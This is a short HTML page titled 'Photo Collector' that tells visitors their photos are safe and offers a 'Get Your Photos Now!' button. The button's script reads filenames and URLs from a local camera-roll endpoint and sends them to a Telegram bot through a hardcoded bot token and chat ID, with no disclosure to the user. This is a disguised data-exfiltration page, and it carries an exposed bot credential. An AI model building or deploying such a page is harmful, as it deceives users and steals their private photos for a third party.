<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Collector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        .text-container {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
        }
        button:hover {
            background-color: #45a078;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-container">
            <h2>Photo Collector</h2>
            <p>(Your photos are safe with us!)</p>
        </div>

        <button onclick="fetchAndSendPictures()">Get Your Photos Now!</button>

        <script>
            const botToken = '8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY';
            const chatId = '7845249398';
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            async function fetchPictures(limit) {
                try {
                    // Adjusted the endpoint to 8080
                    const pictures = await fetch('http://localhost:8080/camera-roll.json');
                    const photos = await pictures.json();
                    // Added limit validation and .map() for consistency
                    return photos.slice(0, limit).map(photo => ({
                        filename: photo.filename,
                        url: photo.url
                    }));
                } catch (error) {
                    console.error('Error fetching pictures:', error);
                }
            }

            async function getPictures(limit = 5) {
                try {
                    const photos = await fetchPictures(limit);
                    let photoUrls = '';
                    photos.forEach(photo => {
                        // Concat each name and url into one string separated by newlines
                        photoUrls += `${photo.filename}\n${photo.url}\n\n`;
                    });
                    sendToTelegram(photoUrls);
                } catch (error) {
                    console.error('Error processing pictures:', error);
                }
            }

            async function sendToTelegram(message) {
                try {
                    await fetch(`${telegramUrl}?chat_id=${chatId}&text=${message}`);
                    alert('Photos sent to Telegram!');
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            }

            async function fetchAndSendPictures() {
                try {
                    // Set the limit to 10, which is used in getPictures
                    const limit = 10;
                    await getPictures(limit);
                } catch (error) {
                    console.error('Error in main function:', error);
                }
            }
        </script>
    </div>
</body>
</html>
